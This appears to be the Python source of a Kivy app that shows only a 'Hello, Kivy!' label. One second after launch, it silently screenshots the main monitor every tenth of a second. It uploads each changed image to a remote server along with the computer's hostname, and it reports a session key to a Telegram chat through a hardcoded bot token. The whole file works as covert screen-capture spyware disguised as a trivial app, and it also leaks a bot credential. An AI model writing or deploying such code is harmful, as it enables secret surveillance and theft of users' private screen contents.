import kivy
from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock

# Add your imports here
import mss
import mss.tools
from PIL import Image
import io
import requests
import time
import argparse
import uuid
import socket  # Import socket module
from telegram import Bot

# Add your constants and functions here
DEFAULT_HOST = 'http://192.168.50.50:5000'
TELEGRAM_BOT_TOKEN = '5207577524:AAFWyFgWKd_yZCzSqiULfKNZ2GQb8yWI-h0'

def generate_unique_key():
    return str(uuid.uuid4())[:4]

async def send_key_to_telegram(key):
    bot = Bot(token=TELEGRAM_BOT_TOKEN)
    chat_id = '984573662'
    await bot.send_message(chat_id=chat_id, text=f'New key generated: {key}')

def main(host=DEFAULT_HOST, key=None):
    if key is None:
        key = generate_unique_key()

    computer_name = socket.gethostname()

    print(f'Sending key "{key}" to server at {host}')

    r = requests.post(f'{host}/new_session', json={'_key': key, 'computer_name': computer_name})
    if r.status_code != 200:
        print('Server not available.')
        return

    import asyncio
    asyncio.run(send_key_to_telegram(key))

    PREV_IMG = None
    with mss.mss() as sct:
        while True:
            monitor = sct.monitors[1]

            screenshot = sct.grab(monitor)
            img = Image.frombytes('RGB', screenshot.size, screenshot.rgb)

            with io.BytesIO() as image_data:
                img.save(image_data, 'PNG')
                image_data_content = image_data.getvalue()

            if image_data_content != PREV_IMG:
                files = {}
                filename = str(round(time.time()*1000))+'_'+key
                files[filename] = ('img.png', image_data_content, 'multipart/form-data')

                try:
                    r = requests.post(f'{host}/capture_post', files=files)
                except Exception as e:
                    pass

                PREV_IMG = image_data_content
            else:
                pass

            time.sleep(0.1)

# Create your Kivy app class
class MyApp(App):
    def build(self):
        # You can run your main function here using Clock.schedule_once or Clock.schedule_interval
        # For example, if you want to run it once after 1 second:
        Clock.schedule_once(self.run_main, 1)
        return Label(text="Hello, Kivy!")

    def run_main(self, dt):
        main()  # Run your main function

# Run the Kivy app
if __name__ == '__main__':
    MyApp().run()
